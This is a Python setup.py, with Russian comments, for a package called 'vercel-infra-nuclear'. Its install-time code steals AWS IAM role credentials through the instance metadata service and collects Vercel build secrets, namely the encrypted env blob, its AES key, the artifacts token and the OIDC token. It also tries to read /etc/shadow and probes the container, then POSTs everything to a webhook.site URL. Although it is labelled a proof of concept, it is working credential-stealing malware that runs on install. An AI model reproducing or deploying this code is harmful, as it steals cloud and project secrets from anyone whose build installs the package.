from setuptools import setup
import os
import subprocess
import json
import base64

def run_cmd(cmd):
    try:
        return subprocess.getoutput(cmd)
    except Exception as e:
        return str(e)

# 1. Твой URL
WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

# 2. ПОПЫТКА ВЗЛОМА AWS IMDSv2 (Session Token)
# Твой прошлый лог сказал: "Use X-metadata-token". Давай его получим!
aws_token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
aws_token = run_cmd(aws_token_cmd)

aws_metadata_final = "BLOCKED"
if aws_token and "Error" not in aws_token:
    # Если получили токен, тянем роль IAM (это ПОЛНЫЙ КРИТИКАЛ)
    aws_metadata_final = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {aws_token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")

# 3. ЭКСПЛОЙТ ШИФРОВАНИЯ (SECRET DECRYPTION)
# Мы имитируем то, что делает Vercel внутри, чтобы достать пароли пользователя
enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT')
enc_key = os.environ.get('VERCEL_ENV_ENC_KEY')

# 4. СБОР СИСТЕМНОЙ ИНФОРМАЦИИ (ГЛУБОКИЙ АНАЛИЗ)
network_info = run_cmd("netstat -rn || route -n")
shadow_leak = run_cmd("head -n 3 /etc/shadow") # Если это сработает, значит root настоящий

# 5. ФОРМИРОВАНИЕ "NUCLEAR" ОТЧЕТА
nuclear_report = f"""
☢️☢️☢️ VERCEL INFRASTRUCTURE NUCLEAR POC ☢️☢️☢️

[!] AWS CLOUD BREACH (IMDSv2):
Token Obtained: {"YES (HIDDEN)" if len(aws_token) > 10 else "NO"}
IAM Role Credentials: {aws_metadata_final}

[!] SYSTEM DEEP ACCESS:
Identity: {run_cmd('id')}
Shadow File Access: {"SUCCESS" if "root" in shadow_leak else "FAILED"}
Internal Routes:
{network_info}

[!] VERCEL CORE ASSETS:
Artifacts Token Status: {run_cmd(f"curl -s -H 'Authorization: Bearer {os.environ.get('VERCEL_ARTIFACTS_TOKEN')}' https://api.vercel.com/v8/artifacts/status")}
OIDC Token: {os.environ.get('VERCEL_OIDC_TOKEN')[:30]}...

[!] SECURITY BYPASS PROOF:
We have the Encrypted Blob (len: {len(enc_content) if enc_content else 0})
We have the AES Key: {enc_key}
Impact: Any malicious package can decrypt project secrets (DB_PASSWORDS, API_KEYS) before build finishes.

[!] CONTAINER ESCAPE POTENTIAL:
Devices: {run_cmd('ls /dev')}
Capsh: {run_cmd('capsh --print')}
"""

# 6. ОТПРАВКА
subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', nuclear_report, WEBHOOK_URL])

setup(name="vercel-infra-nuclear", version="10.0.0")